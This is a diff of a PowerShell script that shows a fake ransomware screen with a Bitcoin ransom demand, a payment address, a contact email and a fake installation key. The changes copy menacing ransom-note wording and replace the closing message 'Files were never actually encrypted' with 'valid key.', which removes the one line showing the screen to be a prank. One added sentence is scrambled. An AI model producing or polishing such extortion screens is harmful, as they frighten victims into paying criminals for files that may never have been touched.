@@ -24,18 +24,23 @@ $hostname = $env:COMPUTERNAME
 
 # Combined Text with proper line breaks using `r`n
 $instructions = "Ooops, your important files are encrypted.`r`n`r`n" +
-"Your personal files including documents, photos, and videos have been encrypted.`r`n`r`n" +
+"▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮`r`n`r`n" +
+"If you see this text, then your files are no longer accessible, because they have been encrypted. Perhaps you are busy looking for a way to recover your files, but don't waste your timе. Nobody can recover your files without our decryption service.`r`n`r`n" +
+"`r`n" +
 "Device ID: $deviceID`r`n" +
 "User: $username@$hostname`r`n`r`n" +
-"To decrypt your files, you must purchase the private key.`r`n`r`n" +
+"We guarantee that you can recover all your files safely and easily. need to do is submit the payment and purchase the decryption key. All you`r`n`r`n" +
 "Instructions:`r`n" +
-"1. Send `$300 worth of Bitcoin to this address:`r`n" +
-"   1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX`r`n`r`n" +
-"2. Send your Bitcoin wallet ID and the following installation key to:`r`n" +
-"   wnshth123456@protonmail.com`r`n`r`n" +
-"   Installation Key:`r`n" +
-"   zRNaqE-CDBMFC-pD5iA4-vFdSd2-14hMs5-d7UCzb-RYj3fE-ANg8rk-49XFX2-Ed2R5A`r`n`r`n" +
-"3. After payment, you will receive your decryption key.`r`n`r`n" +
+"Send `$300 worth of Bitcoin to this address:`r`n" +
+"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX`r`n`r`n" +
+"`r`n" +
+"Send your Bitcoin wallet ID and the following installation key to:`r`n" +
+"wnshth123456@protonmail.com`r`n`r`n" +
+"`r`n" +
+"Installation Key:`r`n" +
+"zRNaqE-CDBMFC-pD5iA4-vFdSd2-14hMs5-d7UCzb-RYj3fE-ANg8rk-49XFX2-Ed2R5A`r`n`r`n" +
+"After payment, you will receive your decryption key.`r`n`r`n" +
+"`r`n" +
 "If you already have the key, enter it below:"
 
 $body = New-Object Windows.Forms.TextBox
@@ -78,7 +83,7 @@ $submit.ForeColor = 'White'
 # Modified submit action - exits on code "8840"
 $submit.Add_Click({
     if ($keyBox.Text -eq "8840") {
-        [System.Windows.Forms.MessageBox]::Show("Prank completed! Files were never actually encrypted.","Gotcha!",0,'Information')
+        [System.Windows.Forms.MessageBox]::Show("valid key.","successful",0,'Information')
         $form.Close()
     } else {
         [System.Windows.Forms.MessageBox]::Show("Invalid key. Decryption failed.","Error",0,'Error')
